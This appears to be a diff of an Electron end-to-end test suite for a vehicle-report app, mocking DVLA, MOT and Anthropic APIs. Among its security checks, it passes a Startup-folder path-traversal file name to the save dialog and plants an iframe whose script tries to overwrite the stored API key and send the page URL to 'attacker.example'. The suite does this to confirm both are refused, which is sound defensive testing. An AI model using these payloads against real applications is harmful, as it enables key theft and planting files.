@@ -22,19 +22,56 @@ const { pathToFileURL } = require('url');
 
 const ROOT = path.join(__dirname, '..');
 const SECOND = process.argv.includes('--second-instance');
+const modeArg = (name) => (process.argv.find((a) => a.startsWith(`--${name}=`)) || '').split('=')[1] || '';
 // child run: start a backup, then close the window ('close') or quit the app ('quit') while it is open
-const QUIT_MODE = (process.argv.find((a) => a.startsWith('--quit-during-backup=')) || '').split('=')[1] || '';
-const OUT = SECOND || QUIT_MODE ? process.env.ERS_E2E_OUT : fs.mkdtempSync(path.join(os.tmpdir(), 'ers-e2e-'));
+const QUIT_MODE = modeArg('quit-during-backup');
+// child run: close the window as soon as the save dialog of a job export ('json') or PDF export ('pdf') is answered
+const EXPORT_MODE = modeArg('close-during-export');
+// child run: the renderer crashes while the page first loads
+const CRASH_LOAD = process.argv.includes('--crash-on-first-load');
+const CHILD = SECOND || QUIT_MODE || EXPORT_MODE || CRASH_LOAD;
+const OUT = CHILD ? process.env.ERS_E2E_OUT : fs.mkdtempSync(path.join(os.tmpdir(), 'ers-e2e-'));
 if (!OUT) { console.error('ERS_E2E_OUT not set'); process.exit(9); }
-if (!SECOND && !QUIT_MODE) for (const d of ['userData', 'temp', 'docs']) fs.mkdirSync(path.join(OUT, d), { recursive: true });
+if (!CHILD) for (const d of ['userData', 'temp', 'docs', 'sdk-config']) fs.mkdirSync(path.join(OUT, d), { recursive: true });
 app.setPath('userData', path.join(OUT, 'userData'));
 app.setPath('temp', path.join(OUT, 'temp'));
 app.setPath('documents', path.join(OUT, 'docs'));
+// The SDK also takes credentials and a base URL from ANTHROPIC_* variables and from an `ant auth login` profile: none
+// of the machine's may reach this test (children inherit this environment).
+for (const k of Object.keys(process.env)) if (/^ANTHROPIC_/.test(k)) delete process.env[k];
+if (process.platform === 'win32') process.env.APPDATA = path.join(OUT, 'sdk-config'); else process.env.XDG_CONFIG_HOME = path.join(OUT, 'sdk-config');
 const childArgs = (arg) => (process.platform === 'linux' ? ['--no-sandbox', '--disable-gpu', __filename, arg] : [__filename, arg]);
 
 if (SECOND) {
   require(path.join(ROOT, 'main.js')); // must quit straight away: the first instance holds the single-instance lock
   setTimeout(() => process.exit(7), 20000);
+} else if (EXPORT_MODE) {
+  // Exits 0 once main.js has let the app quit; the parent then checks the file.
+  const target = path.join(OUT, 'docs', EXPORT_MODE === 'pdf' ? 'report.pdf' : 'AB12CDE.json');
+  let mainWin = null;
+  dialog.showSaveDialog = async () => { setTimeout(() => { if (mainWin && !mainWin.isDestroyed()) mainWin.close(); }, 0); return { canceled: false, filePath: target }; };
+  shell.openPath = async () => '';
+  require(path.join(ROOT, 'main.js'));
+  app.once('browser-window-created', (_e, win) => {
+    mainWin = win;
+    win.webContents.once('did-finish-load', () => {
+      const code = EXPORT_MODE === 'pdf'
+        ? `(() => { const j = Sample.sampleJob(); const t = Report.pdfTemplates(j); desktop.exportPdf({ html: Report.render(j, { mode: 'pdf' }), header: t.header, footer: t.footer, fileName: 'report' }); return 1; })()`
+        : `(() => { desktop.saveFile({ content: '{"photos":"' + 'A'.repeat(40 * 1024 * 1024) + '"}', fileName: 'AB12CDE' }); return 1; })()`;
+      win.webContents.executeJavaScript(code, true).catch(() => {});
+    });
+  });
+  setTimeout(() => process.exit(7), 30000);
+} else if (CRASH_LOAD) {
+  // A session preload that crashes the renderer during the first load (security software ending it looks the same).
+  const boxes = { error: [], message: [] };
+  dialog.showErrorBox = (t, m) => { boxes.error.push(m); };
+  dialog.showMessageBox = async (a, b) => { boxes.message.push((b || a).message); return new Promise(() => {}); }; // left open
+  const pre = path.join(OUT, 'crash-preload.js');
+  fs.writeFileSync(pre, 'process.crash();\n');
+  app.once('browser-window-created', () => { session.defaultSession.registerPreloadScript({ type: 'frame', filePath: pre }); });
+  require(path.join(ROOT, 'main.js'));
+  setTimeout(() => { fs.writeFileSync(path.join(OUT, 'state.json'), JSON.stringify(boxes)); app.exit(0); }, 4000); // main.js decides about its error box 1.5 s after the load fails
 } else if (QUIT_MODE) {
   // Its own userData, so it has its own single-instance lock. Exits 0 once main.js has let the app quit.
   dialog.showSaveDialog = async (a, b) => ({ canceled: false, filePath: path.join(OUT, 'docs', path.basename((b || a).defaultPath)) });
@@ -71,17 +108,32 @@ if (SECOND) {
   app.on('second-instance', () => { R.secondInstanceEvents++; });
 
   const json = (o, status = 200) => new Response(JSON.stringify(o), { status, headers: { 'content-type': 'application/json' } });
+  const utf8 = (s) => new TextEncoder().encode(s);
+  // a streamed (SSE) reply of the Messages API carrying one JSON text block
+  const sse = (type, data) => `event: ${type}\ndata: ${JSON.stringify(Object.assign({ type }, data))}\n\n`;
+  const sseStart = (model) => sse('message_start', { message: { id: 'msg_e2e', type: 'message', role: 'assistant', model, content: [], stop_reason: null, stop_sequence: null, usage: { input_tokens: 10, output_tokens: 1 } } });
+  const sseReply = (model, text) => sseStart(model) + sse('content_block_start', { index: 0, content_block: { type: 'text', text: '' } }) + sse('content_block_delta', { index: 0, delta: { type: 'text_delta', text } })
+    + sse('content_block_stop', { index: 0 }) + sse('message_delta', { delta: { stop_reason: 'end_turn', stop_sequence: null }, usage: { output_tokens: 50 } }) + sse('message_stop', {});
+  const NARRATIVE = { summary: 'Drafted summary.', inspection_condition: '', structural: '', mechanical: '', wheels: '', geometry: '', diagnostics: '', roadworthiness: '', estimate_notes: '', valuation_comments: '', opinion: 'Opinion.', decision: 'Beyond Economical Repair / Total Loss Recommended', category: 'B', review_flags: [] };
+  let aiPlan = []; // per streamed AI request: 'drop' (HTTP 200, then the connection breaks part-way) or 'ok'
   app.whenReady().then(() => {
     protocol.handle('https', async (req) => {
       const u = new URL(req.url);
       const body = req.method === 'POST' ? await req.text() : '';
-      R.requests.push({ host: u.host, path: u.pathname, method: req.method, apiKey: req.headers.get('x-api-key'), auth: !!req.headers.get('authorization'), authorization: u.host === 'api.anthropic.com' ? req.headers.get('authorization') : undefined, cookie: req.headers.get('cookie') });
+      R.requests.push({ host: u.host, path: u.pathname, method: req.method, apiKey: req.headers.get('x-api-key'), auth: !!req.headers.get('authorization'), authorization: u.host === 'api.anthropic.com' ? req.headers.get('authorization') : undefined, cookie: req.headers.get('cookie'), body: u.host === 'api.anthropic.com' ? JSON.parse(body) : undefined });
       if (u.host === 'driver-vehicle-licensing.api.gov.uk') {
         const vrm = JSON.parse(body).registrationNumber;
         if (vrm === 'BL0CK3D') return new Response('<html><title>Access Denied</title><body>Blocked by web filter</body></html>', { status: 403, headers: { 'content-type': 'text/html' } });
         if (vrm === 'REDIR1') return new Response('', { status: 302, headers: { location: 'https://captive.example/login' } });
         if (vrm === 'HANG1') return new Promise(() => {});
+        if (vrm === 'SLOWBODY') return new Response(new ReadableStream({ start(c) { c.enqueue(utf8('{"registrationNumber":"SLOWBODY",')); } }), { status: 200, headers: { 'content-type': 'application/json' } }); // headers in time, then the body stalls
+        if (vrm === 'OLD1') return json({ registrationNumber: vrm, make: 'MORRIS', colour: 'GREEN', yearOfFirstRegistration: 1968 }); // a year, no month
         return json({ registrationNumber: vrm, make: 'FORD', colour: 'BLUE', fuelType: 'PETROL', engineCapacity: 998, yearOfFirstRegistration: 2015, monthOfFirstRegistration: 3, motStatus: 'Valid', motExpiry: '2027-03-01', taxStatus: 'Taxed' });
+      }
+      if (u.host === 'uat.driver-vehicle-licensing.api.gov.uk') { // DVLA's test service knows only its own test registrations
+        const vrm = JSON.parse(body).registrationNumber;
+        if (vrm === 'AA19AAA') return json({ registrationNumber: vrm, make: 'FORD', colour: 'RED', monthOfFirstRegistration: '2019-03', monthOfFirstDvlaRegistration: '2019-03', markedForExport: false });
+        return json({ errors: [{ status: '404', code: '404', title: 'Vehicle Not Found', detail: 'Record for vehicle not found' }] }, 404);
       }
       if (u.host === 'login.microsoftonline.com') return json({ access_token: 'T-' + Date.now(), expires_in: 3600, token_type: 'Bearer' });
       if (u.host === 'history.mot.api.gov.uk') {
@@ -89,6 +141,11 @@ if (SECOND) {
       }
       if (u.host === 'api.anthropic.com' && /\/v1\/messages$/.test(u.pathname)) {
         const reqBody = JSON.parse(body);
+        if (reqBody.stream) {
+          const headers = { 'content-type': 'text/event-stream', 'request-id': 'req_e2e' };
+          if ((aiPlan.shift() || 'ok') === 'drop') return new Response(new ReadableStream({ start(c) { c.enqueue(utf8(sseStart(reqBody.model))); setTimeout(() => c.error(new Error('connection dropped')), 20); } }), { status: 200, headers });
+          return new Response(sseReply(reqBody.model, JSON.stringify(NARRATIVE)), { status: 200, headers });
+        }
         return new Response(JSON.stringify({ id: 'msg_e2e', type: 'message', role: 'assistant', model: reqBody.model, content: [{ type: 'text', text: 'ready' }], stop_reason: 'end_turn', stop_sequence: null, usage: { input_tokens: 10, output_tokens: 1 } }), { status: 200, headers: { 'content-type': 'application/json', 'request-id': 'req_e2e' } });
       }
       return new Response('not mocked', { status: 404 });
@@ -138,6 +195,14 @@ if (SECOND) {
 
     const dvla = await js(`desktop.data.dvla('ab12 cde', 'live')`);
     check('DVLA lookup through net.fetch returns the vehicle', dvla.ok === true && dvla.result && dvla.result.make === 'FORD' && dvla.result.firstRegistration === '2015-03-01', text(dvla));
+    const dv = dvla.result || {};
+    check('DVLA flags the reply did not carry are null ("not stated"), not false ("No"); the result says it came from the live service', dv.markedAsScrapped === null && dv.markedForExport === null && dv.importedOrReRegistered === null && dv.environment === 'live', text({ markedAsScrapped: dv.markedAsScrapped, markedForExport: dv.markedForExport, importedOrReRegistered: dv.importedOrReRegistered, environment: dv.environment }));
+    const old = await js(`desktop.data.dvla('OLD1', 'live')`);
+    check('DVLA year-only first registration: no made-up "1 January" date, the year given on its own', old.ok === true && old.result.firstRegistration === '' && old.result.firstRegistrationYear === 1968, text(old));
+    const uatMiss = await js(`desktop.data.dvla('AB12CDE', 'test')`);
+    check('DVLA test service: "no record" of a real registration says the test service only holds test registrations, and how to switch to Live', uatMiss.ok === false && /^The DVLA test service has no record of AB12CDE\. That service only holds DVLA's test registrations/.test(uatMiss.error) && /set "DVLA service" to Live/.test(uatMiss.error) && R.requests.some((r) => r.host === 'uat.driver-vehicle-licensing.api.gov.uk'), text(uatMiss));
+    const uatHit = await js(`desktop.data.dvla('AA19AAA', 'test')`);
+    check('DVLA test service data is marked environment "test"; a flag it sent (export: false) is kept, one it did not (scrapped) is null', uatHit.ok === true && uatHit.result.environment === 'test' && uatHit.result.markedForExport === false && uatHit.result.markedAsScrapped === null && uatHit.result.firstRegistration === '2019-03-01', text(uatHit));
     const dvlaReq = R.requests.find((r) => r.host === 'driver-vehicle-licensing.api.gov.uk');
     check('DVLA request: cleaned key in x-api-key, no cookie', dvlaReq && dvlaReq.apiKey === 'DVLA-TEST-KEY' && !dvlaReq.cookie, text(dvlaReq));
     const blocked = await js(`desktop.data.dvla('BL0CK3D', 'live')`);
@@ -145,9 +210,10 @@ if (SECOND) {
     const redirect = await js(`desktop.data.dvla('REDIR1', 'live')`);
     check('Redirect refused (keys never follow a redirect)', redirect.ok === false && /redirect/i.test(redirect.error) && !R.requests.some((r) => r.host === 'captive.example'), text(redirect));
     const t0 = Date.now();
-    const hang = await js(`desktop.data.dvla('HANG1', 'live')`);
+    const [hang, slowBody] = await Promise.all([js(`desktop.data.dvla('HANG1', 'live')`), js(`desktop.data.dvla('SLOWBODY', 'live')`)]); // side by side: one 20 s wait
     const hangMs = Date.now() - t0;
     check('Unanswered request times out with a clear message', hang.ok === false && /did not respond|timed? ?out/i.test(hang.error) && hangMs < 45000, `${hangMs} ms ${text(hang)}`);
+    check('A reply whose body stalls after the headers is reported as a timeout through net.fetch, not "cancelled"', slowBody.ok === false && /^The DVLA service did not respond within 20 seconds/.test(slowBody.error) && !/cancelled/.test(slowBody.error), text(slowBody));
 
     const mot = await js(`desktop.data.mot('AB12CDE', 'registration')`);
     const motTests = (mot.result && mot.result.tests) || [];
@@ -156,12 +222,27 @@ if (SECOND) {
     const motReq = R.requests.find((r) => r.host === 'history.mot.api.gov.uk');
     check('MOT request carries Bearer token and API key', motReq && motReq.auth && motReq.apiKey === 'apikey-e2e', text(motReq));
 
+    const noKey = await js(`desktop.ai.test({ model: 'claude-opus-5-5' })`);
+    check('Test connection with no key saved says "No AI key set" (nothing is sent)', noKey.ok === false && noKey.error === 'No AI key set. Add your Anthropic API key in Settings → AI.' && !R.requests.some((r) => r.host === 'api.anthropic.com'), text(noKey));
     const aiSet = await js(`desktop.ai.setKey(' sk-ant-api03-E2ETESTKEY\\u200b ')`);
     const aiStatus2 = await js('desktop.ai.status()');
     check('Anthropic key saved', aiSet.ok === true && aiStatus2.hasKey === true, text(aiStatus2));
     const aiTest = await js(`desktop.ai.test({ model: 'claude-opus-5-5' })`);
     const aiReq = R.requests.find((r) => r.host === 'api.anthropic.com');
     check('AI connection test runs through the SDK and net.fetch', aiTest.ok === true && aiReq && (aiReq.apiKey === 'sk-ant-api03-E2ETESTKEY' || aiReq.authorization === 'Bearer sk-ant-api03-E2ETESTKEY'), `${text(aiTest)} ${text(aiReq && { host: aiReq.host, path: aiReq.path, keySent: !!(aiReq.apiKey || aiReq.authorization) })}`);
+    check('AI requests ask for adaptive thinking explicitly (test connection: Opus 5.5 at effort "low")', !!(aiReq && aiReq.body && aiReq.body.thinking && aiReq.body.thinking.type === 'adaptive' && aiReq.body.output_config && aiReq.body.output_config.effort === 'low'), text(aiReq && aiReq.body && { thinking: aiReq.body.thinking, output_config: aiReq.body.output_config }));
+    // a streamed reply that breaks off after HTTP 200 (the connection drops part-way): sent once more, then explained
+    const aiCount = () => R.requests.filter((r) => r.host === 'api.anthropic.com').length;
+    const draft = `desktop.ai.draftNarrative({ job: Sample.sampleJob(), totals: { labourHours: 20, labour: 1400, parts: 1000, paint: 350, other: 500, net: 3250, vat: 650, gross: 3900, pav: 5682, salvage: 850, pctNet: 57.2, pctGross: 68.64 }, settings: { berThresholdPct: 60, berBasis: 'net' } })`;
+    let n0 = aiCount();
+    aiPlan = ['drop', 'ok'];
+    const drafted = await js(draft);
+    const streamed = R.requests.filter((r) => r.host === 'api.anthropic.com').slice(n0);
+    check('A streamed AI reply that breaks off part-way (net.fetch) is sent once more and then answered; the requests stream with adaptive thinking, server-side fallback and 128K output', drafted.ok === true && drafted.result.decision === NARRATIVE.decision && drafted.result.category === 'B' && streamed.length === 2 && streamed.every((r) => r.body.stream === true && r.body.thinking && r.body.thinking.type === 'adaptive' && r.body.fallbacks === 'default' && r.body.max_tokens === 128000), text({ drafted: drafted.ok ? { decision: drafted.result.decision, category: drafted.result.category } : drafted, requests: streamed.length }));
+    n0 = aiCount();
+    aiPlan = ['drop', 'drop'];
+    const broken = await js(draft);
+    check('A reply that breaks off again: one retry only, then a plain explanation (no raw net:: code)', broken.ok === false && broken.error === 'The connection to the AI service was interrupted while it was answering. Check your internet connection (and any proxy or firewall) and try again.' && aiCount() - n0 === 2, `${text(broken)} requests=${aiCount() - n0}`);
 
     const notif = await js('Notification.requestPermission()');
     const camera = await js('navigator.mediaDevices.getUserMedia({ video: true }).then(() => "granted", (e) => e.name)');
@@ -169,6 +250,9 @@ if (SECOND) {
 
     const save = await js(`desktop.saveFile({ content: '{"a":1}', fileName: '..\\\\..\\\\Startup\\\\update.bat', filters: [{ name: 'Batch', extensions: ['bat'] }] })`);
     check('Save dialog: base name only, forced .json', save.ok === true && /\.json$/i.test(save.filePath) && !/\.\.|Startup[\\/]/i.test(save.filePath) && fs.existsSync(save.filePath), text(save));
+    const save2 = await js(`desktop.saveFile({ content: '{"a":2,"note":"Müller – 🚗"}', fileName: 'update.bat' })`);
+    const docsNow = fs.readdirSync(path.join(OUT, 'docs'));
+    check('Saving over an earlier export replaces it whole (written to a .part file, then renamed), leaving no .part file', save2.ok === true && save2.filePath === save.filePath && fs.readFileSync(save.filePath, 'utf8') === '{"a":2,"note":"Müller – 🚗"}' && !docsNow.some((f) => f.endsWith('.part')), `${text(save2)} ${text(docsNow)}`);
 
     const info = await js('desktop.app.info()');
     check('app.info returns the data folder (userData)', info.ok === true && typeof info.dataFolder === 'string' && path.resolve(info.dataFolder) === path.resolve(OUT, 'userData'), text(info));
@@ -241,6 +325,31 @@ if (SECOND) {
     await new Promise((r) => setTimeout(r, 400));
     check('window.open: web link to the system browser, file link refused, no new window', BrowserWindow.getAllWindows().length === 1 && text(R.external) === text(['https://example.org/advert']), text(R.external));
 
+    // An iframe of another local page would share the app page's file: origin and so reach window.desktop through the
+    // top frame (its calls arriving as the top frame's). It must never load: neither directly, nor by a meta refresh in
+    // a srcdoc iframe. The page's own srcdoc iframe (the report preview) still works.
+    const pack = path.join(OUT, 'claim-pack-frame.html');
+    fs.writeFileSync(pack, `<!doctype html><script>
+      window.__att = { desktop: !!(parent && parent.desktop) };
+      try { parent.desktop.ai.setKey('sk-ant-api03-FROM-THE-IFRAME').then((r) => { window.__att.setKey = r; }); } catch (e) { window.__att.err = String(e); }
+      try { parent.open('https://attacker.example/x?d=' + encodeURIComponent(location.href)); } catch (e) { /* refused */ }
+    </script>`);
+    const externalBefore = R.external.length;
+    const keyBefore = fs.readFileSync(path.join(OUT, 'userData', 'ai-key.bin'));
+    const own = await js(`(async () => {
+      const add = (id, set) => { const f = document.createElement('iframe'); f.id = id; f.style.display = 'none'; set(f); document.body.appendChild(f); return f; };
+      add('e2e-evil-src', (f) => { f.src = ${JSON.stringify(pathToFileURL(pack).href)}; });
+      add('e2e-evil-refresh', (f) => { f.srcdoc = '<meta http-equiv="refresh" content="0;url=${pathToFileURL(pack).href}">'; });
+      const mine = add('e2e-own', (f) => { f.srcdoc = '<p id="p">report preview</p>'; });
+      await new Promise((r) => setTimeout(r, 1500));
+      const p = mine.contentDocument && mine.contentDocument.getElementById('p');
+      return p ? p.textContent : null;
+    })()`);
+    const frameUrls = win.webContents.mainFrame.framesInSubtree.map((f) => f.url);
+    const bridgeAfter = await js('desktop.app.info()');
+    await js(`document.querySelectorAll('#e2e-evil-src, #e2e-evil-refresh, #e2e-own').forEach((f) => f.remove()); 1`);
+    check('An iframe of another local page never loads (src, or a meta refresh in a srcdoc iframe): no bridge call, key unchanged, nothing sent to the browser; the page\'s own srcdoc iframe works and the bridge still answers the page', own === 'report preview' && !frameUrls.some((u) => /claim-pack-frame/.test(u)) && R.external.length === externalBefore && fs.readFileSync(path.join(OUT, 'userData', 'ai-key.bin')).equals(keyBefore) && bridgeAfter.ok === true, `own=${own} frames=${text(frameUrls)} external=${text(R.external.slice(externalBefore))} bridge=${text(bridgeAfter)}`);
+
     const runChild = (arg, out, ms) => new Promise((res) => {
       const p = spawn(process.execPath, childArgs(arg), { stdio: 'ignore', env: { ...process.env, ERS_E2E_OUT: out } });
       const t = setTimeout(() => { p.kill(); res('timeout'); }, ms);
@@ -259,6 +368,32 @@ if (SECOND) {
       try { state = JSON.parse(fs.readFileSync(path.join(dir, 'state.json'), 'utf8')); } catch (e) { state = { error: String(e) }; }
       const left = fs.readdirSync(path.join(dir, 'docs'));
       check(`${mode === 'close' ? 'Closing the window' : 'Quitting the app'} during a backup: the app quits and its temporary file is deleted`, exit === 0 && state.r && state.r.b.ok && state.r.w.ok && state.parts.length === 1 && left.length === 0, `exit=${exit} ${text(state)} left=${text(left)}`);
+    }
+
+    // closing the window while a job export is written, or while a PDF is rendered: the quit waits for it, so the export
+    // is complete (it used to be cut off, leaving a truncated file where the earlier one had been)
+    for (const kind of ['json', 'pdf']) {
+      const dir = path.join(OUT, `export-${kind}`);
+      for (const d of ['userData', 'temp', 'docs']) fs.mkdirSync(path.join(dir, d), { recursive: true });
+      const target = path.join(dir, 'docs', kind === 'pdf' ? 'report.pdf' : 'AB12CDE.json');
+      fs.writeFileSync(target, kind === 'pdf' ? '%PDF-1.4 EARLIER REPORT %%EOF' : '{"earlier":true}');
+      const exit = await runChild(`--close-during-export=${kind}`, dir, 35000);
+      const data = fs.readFileSync(target);
+      let complete = false;
+      if (kind === 'json') { try { complete = JSON.parse(data.toString('utf8')).photos.length === 40 * 1024 * 1024; } catch (e) { complete = false; } }
+      else complete = data.subarray(0, 5).toString('latin1') === '%PDF-' && /%%EOF\s*$/.test(data.subarray(-32).toString('latin1')) && data.length > 2000;
+      const left = fs.readdirSync(path.join(dir, 'docs')).filter((f) => f !== path.basename(target));
+      check(`Closing the window during a ${kind === 'pdf' ? 'PDF export (while it renders)' : '40 MB job export'}: the app waits, the new file is complete, no .part file is left`, exit === 0 && complete && left.length === 0, `exit=${exit} bytes=${data.length} complete=${complete} left=${text(left)}`);
+    }
+
+    // the renderer dying during the first page load: the crash dialog only, not also "could not be loaded"
+    {
+      const dir = path.join(OUT, 'crash-load');
+      for (const d of ['userData', 'temp', 'docs']) fs.mkdirSync(path.join(dir, d), { recursive: true });
+      const exit = await runChild('--crash-on-first-load', dir, 30000);
+      let state = null;
+      try { state = JSON.parse(fs.readFileSync(path.join(dir, 'state.json'), 'utf8')); } catch (e) { state = { error: ['no state: ' + e.message], message: [] }; }
+      check('A renderer that crashes during the first load gets the crash dialog (Reload / Close) only, not also the "could not be loaded" box', exit === 0 && state.error.length === 0 && state.message[0] === 'The Engineer Report Studio window stopped working.', `exit=${exit} ${text(state)}`);
     }
 
     // ---- the page hanging or crashing: dialog, reload in a new renderer process, saved data read again ----
